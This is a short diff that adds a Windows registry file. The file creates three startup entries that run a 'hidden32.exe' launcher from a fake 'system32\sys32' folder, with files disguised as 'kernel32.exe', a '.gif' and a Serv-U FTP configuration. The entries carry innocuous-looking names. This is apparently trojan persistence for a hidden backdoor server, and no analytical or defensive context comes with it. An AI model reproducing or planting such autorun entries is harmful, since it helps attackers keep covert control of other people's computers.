@@ -1,0 +1,6 @@
+Windows Registry Editor Version 5.00
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"WinSrv"="C:\\windows\\system32\\sys32\\sys32.bat"
+"Win32D"="C:\\windows\\system32\\sys32\\hidden32.exe C:\\windows\\system32\\sys32\\kernel32.exe C:\\windows\\system32\\sys32\\msdll.gif"
+"Office32"="C:\\windows\\system32\\sys32\\hidden32.exe C:\\windows\\system32\\sys32\\office.exe C:\\windows\\system32\\sys32\\Serv-U.ini"
+
